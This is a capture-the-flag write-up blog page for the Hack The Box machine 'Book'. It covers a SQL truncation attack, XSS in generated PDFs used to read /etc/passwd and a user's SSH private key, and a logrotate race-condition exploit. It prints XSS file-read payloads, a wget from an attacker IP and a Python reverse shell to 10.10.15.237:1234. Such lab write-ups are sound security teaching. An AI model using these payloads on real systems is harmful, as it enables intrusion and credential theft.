@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" type="text/css" href="/css/style.css">
+  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Nmap Scan &mdash; fmash16's blog</title>
+<meta property="og:title" content=""Hackthebox - Book Writeup"" />
+      <meta property="og:description" content="A medium difficulty linux machine having real world like vulnerability" />
+      <meta property="og:type" content="article" />
+      <meta property="og:url" content="github" />
+      <meta property="og:image" content="/img/htb_book/card.png" />
+
+</head>
+
+<body>
+  <!-- Side navigation -->
+	<div class="sidebar">
+    <div class="vertical-center">
+      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
+      <p style="text-align:center; color:#eee">
+      <b style="font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
+      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
+      <p style="text-align:center;font-size:20px">
+        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
+        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
+        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
+        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
+      </p>
+    </div>
+	</div>
+
+<article>
+<div class="figure">
+<img src="/img/htb_book/card.png" />
+
+</div>
+<h1 id="nmap-scan">Nmap Scan</h1>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">nmap</span> -sC -sV -sS -oN nmap.out book.htb</code></pre></div>
+<p>Open ports:</p>
+<ul>
+<li>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</li>
+<li>80/tcp open http Apache httpd 2.4.29 ((Ubuntu))</li>
+</ul>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="web">Web</h2>
+<p>Going to the webpage, we find a login prompt. We sign up for an accound and login.</p>
+<div class="figure">
+<img src="/img/htb_book/1.png" />
+
+</div>
+<div class="figure">
+<img src="/img/htb_book/2.png" />
+
+</div>
+<p>There is a section called &quot;Collections&quot; where we can submit a book. Seems like we can upload a file to the server. We try uploading a php-web-shell and succeed. But we dont know the location where the submission is stored yet.</p>
+<div class="figure">
+<img src="/img/htb_book/3.png" />
+
+</div>
+<p>From the &quot;Contact us&quot; option, we find the admin email account:</p>
+<blockquote>
+<p>admin@book.htb</p>
+</blockquote>
+<h2 id="gobuster-fuzzing">Gobuster fuzzing</h2>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">gobuster</span> dir -u http://book.htb/ -w /usr/share/wordlists/dirb/common.txt</code></pre></div>
+<div class="figure">
+<img src="/img/htb_book/4.png" />
+
+</div>
+<p>We find a folder /doc, which might contain our uploaded file. But we cannot access it yet. We also see a /admin page.</p>
+<h2 id="doc">/doc</h2>
+<p>Going to the home page of the site after logging in, we find some pdf files describing flowers. These can be downloaded and are named in the format <code>1.pdf</code>. From a hunch, we try the url http://book.htb/1.pdf and we do in fact get the same pdf file. So the pdf files are stored in the /doc folder.</p>
+<p>So /doc should be where our submissions go. But trying to open our submission going to the url http://book.htb/docs/php-reverse-shell.php shows a 404. So either our file was not uploaded or its name was changed.</p>
+<h2 id="admin-login">/admin login</h2>
+<p>Going over to /admin page, we find a login prompt similar to the previous one found, but this one shows for authorized people only.</p>
+<div class="figure">
+<img src="/img/htb_book/5.png" />
+
+</div>
+<p>We try logging in with our created account but fail.(duh!)</p>
+<h2 id="admin-account---sql-truncation-attack">admin account - SQL truncation attack</h2>
+<p>Looking at the source of the signup page, we find something interesting</p>
+<div class="sourceCode"><pre class="sourceCode js"><code class="sourceCode javascript"><span class="kw">function</span> <span class="at">validateForm</span>() <span class="op">{</span>
+  <span class="kw">var</span> x <span class="op">=</span> <span class="va">document</span>.<span class="at">forms</span>[<span class="st">&quot;myForm&quot;</span>][<span class="st">&quot;name&quot;</span>].<span class="at">value</span><span class="op">;</span>
+  <span class="kw">var</span> y <span class="op">=</span> <span class="va">document</span>.<span class="at">forms</span>[<span class="st">&quot;myForm&quot;</span>][<span class="st">&quot;email&quot;</span>].<span class="at">value</span><span class="op">;</span>
+  <span class="cf">if</span> (x <span class="op">==</span> <span class="st">&quot;&quot;</span>) <span class="op">{</span>
+    <span class="at">alert</span>(<span class="st">&quot;Please fill name field. Should not be more than 10 characters&quot;</span>)<span class="op">;</span>
+    <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span>
+  <span class="op">}</span>
+  <span class="cf">if</span> (y <span class="op">==</span> <span class="st">&quot;&quot;</span>) <span class="op">{</span>
+    <span class="at">alert</span>(<span class="st">&quot;Please fill email field. Should not be more than 20 characters&quot;</span>)<span class="op">;</span>
+    <span class="cf">return</span> <span class="kw">false</span><span class="op">;</span>
+  <span class="op">}</span></code></pre></div>
+<p>So this script shows that our inputs in the fields should be limited by the set number of characters. What if we give a longer input? It will get truncated. This is known as <a href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html">SQL Truncation Attack</a></p>
+<p>So if we create an account with a name like <code>&quot;admin      hello&quot;</code>, the script will truncate all characters after the 10th. And so our name becomes admin, and we could run admin on the site. The form must allow spaces in the name for this. We check for that and find that we can in fact input spaces.</p>
+<p>Now, we try creating our admin account. The signup page seems to perform a client side email validation. To bypass that, we craft our request using burp. We intercept a signup request and edit that as per our needs. Our crafted http request stands</p>
+<pre class="http"><code>POST /index.php HTTP/1.1
+Host: book.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://book.htb/index.php
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Length: 61
+
+name=admin+++++a&amp;email=admin%40book.htb++++++a&amp;password=hello</code></pre>
+<p>We have URL encoded the params after adding necessary number of spaces. Now we send the POST request and try logging in with the admin account with our set password. And we succeed.</p>
+<div class="figure">
+<img src="/img/htb_book/6.png" />
+
+</div>
+<h2 id="file-upload">File upload</h2>
+<p>Now, logged in as admin, we can view the collections files stored in a pdf file with links to the files. Submitting our php-web-shell, we do not see</p>
+<div class="figure">
+<img src="/img/htb_book/8.png" />
+
+</div>
+<p>that in our collections, so it was not uploaded. We are only allowed to upload pdf files. We upload a random pdf file and download the collections pdf. We see that our included pdf is listed with a number. So our upload gets renamed by a number.</p>
+<p>Another thing we notice is that the pdf is dynamically generated each time we request for a download. This dynamic generation of the pdf file can be exploited using XSS since we control the input filename. It took me quite a long time to fine this. This can be used to read local files. This has been explained <a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html">here.</a></p>
+<p>So in order to exploit the XSS, we input the following script as the &quot;Book Title&quot; and enter any random pdf file</p>
+<div class="sourceCode"><pre class="sourceCode js"><code class="sourceCode javascript"><span class="op">&lt;</span>script<span class="op">&gt;</span>x<span class="op">=</span><span class="kw">new</span> XMLHttpRequest<span class="op">;</span><span class="va">x</span>.<span class="at">onload</span><span class="op">=</span><span class="kw">function</span>()<span class="op">{</span><span class="va">document</span>.<span class="at">write</span>(<span class="kw">this</span>.<span class="at">responseText</span>)<span class="op">};</span><span class="va">x</span>.<span class="at">open</span>(<span class="st">&quot;GET&quot;</span><span class="op">,</span><span class="st">&quot;file:///etc/passwd&quot;</span>)<span class="op">;</span><span class="va">x</span>.<span class="at">send</span>()<span class="op">;&lt;</span><span class="ss">/script&gt;</span></code></pre></div>
+<p>Then we download the collections pdf from the admin page and see the /etc/passwd file 79101.pdf <img src="/img/htb_book/9.png" /></p>
+<p>We find a user named <strong>reader</strong></p>
+<h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
+<h2 id="getting-id_rsa-of-user">Getting id_rsa of user</h2>
+<p>Since we can read any local files, lets try reading the id_rsa of the found user &quot;reader&quot; at /home/reader/.ssh/id_rsa.</p>
+<div class="sourceCode"><pre class="sourceCode js"><code class="sourceCode javascript"><span class="op">&lt;</span>script<span class="op">&gt;</span>x<span class="op">=</span><span class="kw">new</span> XMLHttpRequest<span class="op">;</span><span class="va">x</span>.<span class="at">onload</span><span class="op">=</span><span class="kw">function</span>()<span class="op">{</span><span class="va">document</span>.<span class="at">write</span>(<span class="kw">this</span>.<span class="at">responseText</span>)<span class="op">};</span><span class="va">x</span>.<span class="at">open</span>(<span class="st">&quot;GET&quot;</span><span class="op">,</span><span class="st">&quot;file:///home/reader/.ssh/id_rsa&quot;</span>)<span class="op">;</span><span class="va">x</span>.<span class="at">send</span>()<span class="op">;&lt;</span><span class="ss">/script&gt;</span></code></pre></div>
+<p>And we get the private key. We can use this for ssh login to the user account.</p>
+<div class="figure">
+<img src="/img/htb_book/10.png" />
+
+</div>
+<h2 id="pdf2txt-conversion">pdf2txt conversion</h2>
+<p>The key if copied from the pdf to a file, is not in the correcto id_rsa format. To convert the pdf to txt, we use a python tool called <a href="https://github.com/pdfminer/pdfminer.six">pdfminer.six</a></p>
+<p>We install it using</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">sudo</span> apt install python3-pdfminer
+<span class="ex">pip</span> install pdfminer.six</code></pre></div>
+<p>Then, we convert the pdf to txt and do some editing in spaces to get the correct format id_rsa.</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">python3</span> /usr/local/bin/pdf2txt.py 64757.pdf<span class="op">&gt;</span>id_rsa</code></pre></div>
+<h2 id="ssh-login-with-id_rsa">SSH login with id_rsa</h2>
+<p>We change the permissions of the id_rsa</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">chmod</span> 600 id_rsa</code></pre></div>
+<p>And then we login to the machine as user reader</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">bash</span> -i id_rsa reader@book.htb</code></pre></div>
+<p>And we get the shell of the user. And we can read the user.txt</p>
+<div class="figure">
+<img src="/img/htb_book/11.png" />
+
+</div>
+<h1 id="privilege-escalation---root">Privilege Escalation - root</h1>
+<h2 id="enumeration-1">Enumeration</h2>
+<p>linpeas.sh gives us some interesting info about system timers</p>
+<div class="figure">
+<img src="/img/htb_book/12.png" />
+
+</div>
+<p>We find a timer named book.timer that seems to run at an interval of 1m.</p>
+<p>To see what the timer executes, we run pspy64 to monitor the processes. And get what commands the timer runs.</p>
+<div class="figure">
+<img src="/img/htb_book/13.png" />
+
+</div>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">/usr/sbin/logrotate</span> -f /root/log.cfg
+<span class="ex">/bin/sh</span> /root/log.sh
+<span class="fu">sleep</span> 5</code></pre></div>
+<p>The timer seems to run logrotate</p>
+<h2 id="logrotate-race-condition-exploit">logrotate race condition exploit</h2>
+<p>“Log rotation” refers to the practice of archiving an application’s current log, starting a fresh log, and deleting older logs. Googling around we find that logrotate is vulnerable to a race condition.</p>
+<p>This working of this exploit is described fully at <a href="https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition">feedyourhead</a>. A PoC can be found on <a href="https://github.com/whotwagner/logrotten">github</a> by whotwanger. We can use this PoC for our case.</p>
+<p>As per the instructions, we execute the follwing :</p>
+<ol style="list-style-type: decimal">
+<li>We download the c file to our target and compile it. Next we create our payload containing our reverse shell. We need to background the shell, otherwise we will not get a stable shell. Next we run the compiled source with required args.</li>
+</ol>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="fu">wget</span> http://10.10.15.237:8000/logrotten.c
+<span class="fu">gcc</span> -o logrotten logrotten.c
+<span class="bu">echo</span> <span class="st">&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;</span>10.10.15.237<span class="st">&quot;,1234));os.dup2(s.fileno(),0);</span>
+<span class="st">os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;</span>/bin/sh<span class="st">&quot;,&quot;</span>-i<span class="st">&quot;]);&#39; &amp;</span>
+<span class="st">./logrotten -d -p ./payloadfile /home/reader/backups/access.log</span></code></pre></div>
+<ol start="2" style="list-style-type: decimal">
+<li>Next we need to write some random contents to the access.log file in backups. This necessary because the log file is not rotated if the file is empty and the <code>notifempty</code> parameter is set in the conf file. It is safe to write a big amount of junk into the logfile in case the <code>size</code> parameter is set in the conf file for logrotate, in which case, the rotation will only occur when the logfile gets larger than the sepcified size.</li>
+</ol>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="bu">echo</span> hello <span class="op">&gt;</span> access.log</code></pre></div>
+<ol start="3" style="list-style-type: decimal">
+<li>We fire up a nc listener on our host</li>
+</ol>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">nc</span> -lnvp 1234</code></pre></div>
+<p>And we get a root shell. We can now read our root.txt file.</p>
+<div class="figure">
+<img src="/img/htb_book/14.png" />
+
+</div>
+<p>PS: The root shell will only be active for a short time. So the commands need to be executed fast. After a short time, the shell exists but the tty cannot be accessed anymore and you will get an error:</p>
+<div class="sourceCode"><pre class="sourceCode bash"><code class="sourceCode bash"><span class="ex">/bin</span>/sh: <span class="ex">3</span>: Cannot set tty process group (Inappropriate ioctl for device)
+<span class="ex">/bin</span>/sh: <span class="ex">3</span>: Cannot set tty process group (Inappropriate ioctl for device)</code></pre></div>
+<p>The reason this happens, according to my guess, is that when our payload gets executed as root, the shell opens as interactive tty. But a while later, the child process id disconnected from the tty. So we see a zombie shell.</p>
+<h1 id="resources">Resources</h1>
+<ul>
+<li>https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf</li>
+<li>https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html</li>
+<li>https://support.rackspace.com/how-to/understanding-logrotate-utility/</li>
+<li>https://github.com/whotwagner/logrotten</li>
+<li>https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition</li>
+<li>https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges</li>
+</ul>
+</article>
+
+<footer>
+  <p> By fmash16 </p>
+</footer>
+</body>
